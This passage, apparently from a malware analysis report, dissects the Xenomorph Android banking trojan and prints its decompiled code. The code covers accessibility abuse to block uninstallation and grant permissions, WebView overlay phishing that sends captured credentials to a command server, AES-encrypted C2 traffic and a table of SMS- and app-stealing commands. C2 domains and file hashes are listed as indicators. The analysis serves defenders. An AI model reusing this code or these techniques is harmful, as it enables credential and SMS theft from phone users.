        UtilGlobal.Log("onAccessibilityEvent", "###                packageName: " + ((Object) accessibilityEvent.getPackageName()));
        UtilGlobal.Log("onAccessibilityEvent", "###                class: " + UtilAccessibility.getEventClassName(accessibilityEvent));
        this.priorityManager.process(accessibilityEvent);
        if (this.priorityManager.hasBlockingActionInList()) {
            UtilGlobal.Log("onAccessibilityEvent", "AccessibilityPriorityManager has blocking action in list. Ignoring");
            return;
        }
        int eventType = accessibilityEvent.getEventType();
        if (eventType == 1) {
            UtilGlobal.Log("onAccessibilityEvent", "###                type: TYPE_VIEW_CLICKED");
        } else if (eventType == 2) {
            UtilGlobal.Log("onAccessibilityEvent", "###                type: TYPE_VIEW_LONG_CLICKED");
        } else {
            switch (eventType) {
                case 4:
                    UtilGlobal.Log("onAccessibilityEvent", "###                type: TYPE_VIEW_SELECTED");
                    break;
                case 32:
                    UtilGlobal.Log("onAccessibilityEvent", "###                type: TYPE_WINDOW_STATE_CHANGED");
                    windowStateChangedEvent(accessibilityEvent);
                    break;
                    ...
                    ...
                    ...
                    ...
                case 4194304:
                    UtilGlobal.Log("onAccessibilityEvent", "###                type: TYPE_WINDOWS_CHANGED");
                    break;
                case 8388608:
                    UtilGlobal.Log("onAccessibilityEvent", "###                type: TYPE_VIEW_CONTEXT_CLICKED");
                    break;
                case Http2Connection.OKHTTP_CLIENT_WINDOW_SIZE /* 16777216 */:
                    UtilGlobal.Log("onAccessibilityEvent", "###                type: TYPE_ASSIST_READING_CONTEXT");
                    break;
            }
        }
        handleRemainingActions(accessibilityEvent);
    }
```

The service also sets up deletion prevention and accessibility disable prevention, So if such dialogue is detected, it exits the dialogue.

A dedicated Xiaomi functionality is run for getting accessibility permission and bypassing DozeMode in addition to setting itself up as the default SMS app.

```java
    public void windowStateChangedEvent(AccessibilityEvent accessibilityEvent) {
        if (accessibilityEvent.getPackageName() == null) {
            return;
        }
        if (UtilGlobal.injectionsEnabled(this) && UtilGlobal.packageHasInjection(this, accessibilityEvent.getPackageName().toString())) {
            Intent intent = new Intent(this, OverlayInjectActivity.class);
            intent.addFlags(268435456);
            intent.addFlags(8388608);
            UtilGlobal.SettingsWrite(this, Constants.appInjectTag, accessibilityEvent.getPackageName().toString());
            startActivity(intent);
        } else if (UtilAccessibility.getEventClassName(accessibilityEvent).equals("com.miui.home.launcher.uninstall.deletedialog")) {
            UtilAccessibility.goBack(this, 2);
        } else if (UtilAccessibility.getEventClassName(accessibilityEvent).equals("com.android.packageinstaller.uninstalleractivity")) {
            UtilAccessibility.goBack(this, 2);
        } else if (accessibilityEvent.getPackageName().equals("com.google.android.packageinstaller")) {
            UtilAccessibility.goBack(this, 2);
        } else if ((accessibilityEvent.getPackageName().equals("com.google.android.apps.messaging") && UtilGlobal.isSmsDefaultAppSet(this)) || ((accessibilityEvent.getPackageName().equals("com.android.mms") && UtilGlobal.isSmsDefaultAppSet(this)) || (accessibilityEvent.getPackageName().equals("com.samsung.android.messaging") && UtilGlobal.isSmsDefaultAppSet(this)))) {
            UtilAccessibility.goBack(this, 1);
        }
        this.modulesManager.performAllNecessary(this, accessibilityEvent);
        if (UtilAccessibility.checkPermissionsClick(this, accessibilityEvent)) {
            UtilGlobal.Log("windowStateChangedEvent", "grantPermissionsClick called");
            UtilAccessibility.grantPermissionsClick(this, accessibilityEvent);
        }
        DozeModeAccessibilityModule.performIfNecessary(this, accessibilityEvent);
        XiaomiDozeModeAccessibilityModule.performIfNecessary(this, accessibilityEvent);
        DisablePreventionAccessibilityModule.performIfNecessary(this, accessibilityEvent);
        DefaultSmsAppAccessibilityModule.performIfNecessary(this, accessibilityEvent);
        DeletionPreventionAccessibilityModule.performIfNecessary(this, accessibilityEvent);
        XiaomiSpecialPermissionInterceptActivityModule.performIfNecessary(this, accessibilityEvent);
        UtilGlobal.Log(TAG, "Marking screen as last seen: " + UtilAccessibility.getEventClassName(accessibilityEvent));
        UtilGlobal.SettingsWrite(this, Constants.lastScreenTag, UtilAccessibility.getEventClassName(accessibilityEvent));
    }
```

If the running app is set to have an overlay injection, it'll initiate it. Webview is used to view the fake app interface to the user and reports stolen data back to the C2.

The overlay data is downloaded and decrypted with the hardcoded key.

```java
    protected void onStart() {
        super.onStart();
        this.context = this;
        OverlayInjectResource packageInjection = UtilGlobal.getPackageInjection(this, UtilGlobal.SettingsRead(this, Constants.appInjectTag));
        this.resource = packageInjection;
        this.hideStop = true;
        if (this.stopActivity || packageInjection == null) {
            return;
        }
        try {
            WebView webView = new WebView(this);
            this.wv = webView;
            webView.getSettings().setJavaScriptEnabled(true);
            this.wv.setScrollBarStyle(0);
            this.wv.setWebViewClient(new MyWebViewClient());
            this.wv.setWebChromeClient(new MyWebChromeClient());
            this.wv.addJavascriptInterface(new WebAppInterface(this), "Android");
            this.wv.loadDataWithBaseURL(null, this.resource.getPageResource(this), "text/html", "UTF-8", null);
            setContentView(this.wv);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
```

```java
        public void returnResult(String str) {
            new ApiOperationController().sendRequest(this.parent, new ApiInjectionSuccessRequestPayload("inj_success", new ApiInjectionSuccess(UtilGlobal.SettingsRead(this.parent, Constants.appInjectTag), str)), true);
            OverlayInjectActivity overlayInjectActivity = this.parent;
            UtilGlobal.flagPackageInjectionIgnored(overlayInjectActivity, overlayInjectActivity.resource.id);
            this.parent.finish();
        }
```

### Network Communications

A new AES key is obtained after "verifying" with the C2 which is used for further traffic encryption/decryption.

```java
    public void sendRequest(Context context, ApiMetricsPayloadGeneric apiMetricsPayloadGeneric, boolean z) {
        UtilGlobal.Log("sendRequest", ">>> " + apiMetricsPayloadGeneric.toJson());
        this.contextWeakReference = new WeakReference<>(context);
        byte[] verificationBytes = UtilGlobal.getVerificationBytes(context);
        if (verificationBytes == null || verificationBytes.length != 16) {
            return;
        }
        byte[] androidIDBytes = UtilGlobal.getAndroidIDBytes(context);
        Pair<byte[], byte[]> encryptMessage = UtilEncryption.encryptMessage(apiMetricsPayloadGeneric.toJson().getBytes(StandardCharsets.UTF_8), verificationBytes);
        if (encryptMessage == null || encryptMessage.second == null || encryptMessage.first == null) {
            return;
        }
        ApiOperationBody apiOperationBody = new ApiOperationBody(UtilEncryption.digestAndEncodeMessage(UtilEncryption.concatenateBytes(Constants.testKey, verificationBytes, (byte[]) encryptMessage.second)), UtilEncryption.digestAndEncodeMessage(androidIDBytes), UtilEncryption.encodeBase64((byte[]) encryptMessage.second), UtilEncryption.encodeBase64((byte[]) encryptMessage.first));
        ApiInterface apiInterface = ApiClient.getInterface(context);
        if (z) {
            UtilGlobal.Log("sendRequest", apiOperationBody.toString());
            asyncVoidCall(apiInterface.voidOperation(apiOperationBody));
            return;
        }
        apiInterface.operation(apiOperationBody).enqueue(this);
    }
```

```java
    public void onResponse(Call<ApiOperationBody> call, Response<ApiOperationBody> response) {
        byte[] verificationBytes = UtilGlobal.getVerificationBytes(this.contextWeakReference.get());
        byte[] androidIDBytes = UtilGlobal.getAndroidIDBytes(this.contextWeakReference.get());
        ApiOperationBody body = response.body();
        if (body == null) {
            UtilGlobal.Log("onResponse", "body == null");
            return;
        }
        byte[] decodeBase64 = UtilEncryption.decodeBase64(body.hash);
        byte[] decodeBase642 = UtilEncryption.decodeBase64(body.id);
        byte[] decodeBase643 = UtilEncryption.decodeBase64(body.iv);
        byte[] decryptMessage = UtilEncryption.decryptMessage(UtilEncryption.decodeBase64(body.metrics), verificationBytes, decodeBase643);
        if (!UtilEncryption.digestCompare(androidIDBytes, decodeBase642)) {
            UtilGlobal.Log("onResponse", "UID digest is wrong");
        } else if (!UtilEncryption.digestCompare(UtilEncryption.concatenateBytes(Constants.testKey, verificationBytes, decodeBase643), decodeBase64)) {
            UtilGlobal.Log("onResponse", "KEY/SID/IV digest is wrong");
        } else {
            parsePayload(decryptMessage);
        }
    }
```

The parsed payload could also contain C2 commands to be executed by Xenomorph on the infected device. Some of those don't seem to be implemented yet.

| Command | Action |
| ------ | ------- |
| sms_log | Sends user SMS back to C2 in the following form : `SmsModel {id = "Sender ID/Name", recipient = "Recipient", message = "Message Body", readState = "Message Read Status", time = "Message timestamp", type = " Inbox/Sent/Draft/Outbox/Failed/Queued/Unknown "}` |
| notif_ic_disable | Disable notification listener |
| notif_ic_enable | Enable notification listener |
| sms_ic_disable | Disable SMS listener |
| sms_ic_enable | Enable SMS listener |
| inj_enable | Enable overlay injections |
| inj_disable | Disable overlay injections |
| app_list | Report back with a list of package names of installed apps |
| inj_update | Updates the injections list |
| fg_disable | Not Implemented |
| inj_list | Not Implemented |
| self_kill | Not Implemented |
| self_cleanup | Not Implemented |
| notif_ic_update | Not Implemented |
| fg_enable | Not Implemented |
| app_kill | Not Implemented |
| sms_ic_update | Not Implemented |
| sms_ic_list | Not Implemented |
| notif_ic_list | Not Implemented |

After execution, Xenomorph reports back with the success state and the requested data.

### Cryptography

For encryption and decryption `AES_128` over `CBC` mode is used.

```java
    public static Pair<byte[], byte[]> encryptMessage(byte[] bArr, byte[] bArr2) {
        SecretKeySpec secretKeySpec = new SecretKeySpec(bArr2, 0, bArr2.length, "AES");
        byte[] bArr3 = null;
        try {
            Cipher cipher = Cipher.getInstance("AES_128/CBC/PKCS5PADDING");
            try {
                cipher.init(1, secretKeySpec);
            } catch (InvalidKeyException e) {
                e.printStackTrace();
            }
            if (bArr != null) {
                try {
                    bArr3 = cipher.doFinal(bArr);
                } catch (BadPaddingException | IllegalBlockSizeException e2) {
                    e2.printStackTrace();
                    return null;
                }
            }
            return new Pair<>(bArr3, cipher.getIV());
        } catch (NoSuchAlgorithmException | NoSuchPaddingException e3) {
            e3.printStackTrace();
            return null;
        }
    }

    public static byte[] decryptMessage(byte[] bArr, byte[] bArr2, byte[] bArr3) {
        SecretKeySpec secretKeySpec = new SecretKeySpec(bArr2, 0, bArr2.length, "AES");
        try {
            Cipher cipher = Cipher.getInstance("AES_128/CBC/PKCS5PADDING");
            try {
                cipher.init(2, secretKeySpec, new IvParameterSpec(bArr3));
                try {
                    return cipher.doFinal(bArr);
                } catch (BadPaddingException | IllegalBlockSizeException e) {
                    e.printStackTrace();
                    return null;
                }
            } catch (InvalidAlgorithmParameterException | InvalidKeyException e2) {
                e2.printStackTrace();
                return null;
            }
        } catch (NoSuchAlgorithmException | NoSuchPaddingException e3) {
            e3.printStackTrace();
            return null;
        }
    }

    public static byte[] digestMessage(byte[] bArr) {
        try {
            return MessageDigest.getInstance("SHA-256").digest(bArr);
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
            return null;
        }
    }
```

## IOCs

* URLs
  
  ```text
  "simpleyo5.tk", "simpleyo5.cf", "kart12sec.ga", "kart12sec.gq"
  ```

* Files
  + `hq.json` SHA-256 : `40c6b36a316b596fca2b84cd4d65d745bd15d1c90c1428050b3e71917c1ee360`, SSDEEP : `24576:qmHDlxanaI7etIpMHas6mpWV/+IgHwfRL:qmc2I+NS//ZfRL`
  + `ring0.xml`
